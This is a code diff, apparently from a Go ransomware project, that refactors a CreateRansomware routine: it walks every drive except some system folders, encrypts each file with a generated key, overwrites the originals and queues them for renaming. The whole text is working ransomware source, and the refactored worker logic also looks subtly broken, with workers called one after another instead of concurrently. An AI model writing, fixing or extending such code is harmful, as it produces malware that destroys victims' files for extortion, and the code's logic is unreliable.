@@ -9,6 +9,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"sync"
 )
@@ -28,7 +29,9 @@ var (
 
 	tempDir = os.Getenv("TEMP") + "\\"
 
-	fileTracker *FileTracker
+	fileTracker = FileTracker{
+		Files: make(chan *PirateFile),
+	}
 
 	filesToRename struct {
 		Files []*PirateFile
@@ -39,6 +42,8 @@ var (
 		id string
 		encKey string
 	}
+
+	numWorkers = runtime.NumCPU()
 
 	SkippedDirs = []string{
 		"ProgramData",
@@ -87,7 +92,7 @@ var (
 	}
 )
 
-func CreateRansomware(clientTimeout float64, numWorkers int) {
+func CreateRansomware(clientTimeout float64) {
 
 	id, err := generateRandomHexString(32)
 	if err != nil {
@@ -100,8 +105,9 @@ func CreateRansomware(clientTimeout float64, numWorkers int) {
 	keys.id = id
 	keys.encKey = encKey
 
-	walkDrives(getDrives())
-	encryptFiles(numWorkers)
+	go walkDrives(getDrives())
+	fileTracker.Add(numWorkers)
+	startWorkers(numWorkers)
 	renameFiles()
 }
 
@@ -131,61 +137,50 @@ func walkDrive(path string, f os.FileInfo, err error) error {
 				Extension: ext[1:],
 				FullPath: path,
 			}
-			fileTracker.Add(1)
 		}
 	}
 	return nil
 }
 
 func walkDrives(dirs []string) {
-	go func() {
-		defer fileTracker.Done()
-		for _, dir := range dirs {
-			err := filepath.Walk(dir, walkDrive)
-			if err != nil {
-				log.Println(err)
-			}
-		}
-		close(fileTracker.Files)
-	}()
+	for _, dir := range dirs {
+		filepath.Walk(dir, walkDrive)
+	}
+	close(fileTracker.Files)
 }
 
-func encryptFiles(numWorkers int) {
+func startWorkers(numWorkers int) {
 	for i := 0; i < numWorkers; i++ {
-		go func() {
-			for {
-				file, ok := <-fileTracker.Files
-				if !ok {
-					return
-				}
-				tempFile, err := os.OpenFile(tempDir+file.Name(),
-					os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
-				if err != nil {
-					log.Println(err)
-					return
-				}
-				err = file.Encrypt(keys.encKey, tempFile); if err != nil {
-					log.Println(err)
-					continue
-				}
-				err = tempFile.Close(); if err != nil {
-					log.Println(err)
-				}
-
-				err = file.ReplaceBy(tempDir + file.Name()); if err != nil {
-					log.Println(err)
-					continue
-				}
-
-				filesToRename.Lock()
-				filesToRename.Files = append(filesToRename.Files, file)
-				filesToRename.Unlock()
-
-				fileTracker.Done()
-			}
-		}()
+		encryptFiles()
 	}
-	fileTracker.Wait()
+}
+
+func encryptFiles() {
+	for file := range fileTracker.Files {
+		tempFile, err := os.OpenFile(tempDir+file.Name(),
+			os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+		err = file.Encrypt(keys.encKey, tempFile); if err != nil {
+			log.Println(err)
+			continue
+		}
+		err = tempFile.Close(); if err != nil {
+			log.Println(err)
+		}
+
+		err = file.ReplaceBy(tempDir + file.Name()); if err != nil {
+			log.Println(err)
+			continue
+		}
+
+		filesToRename.Lock()
+		filesToRename.Files = append(filesToRename.Files, file)
+		filesToRename.Unlock()
+	}
+	fileTracker.Done()
 }
 
 func renameFiles() {
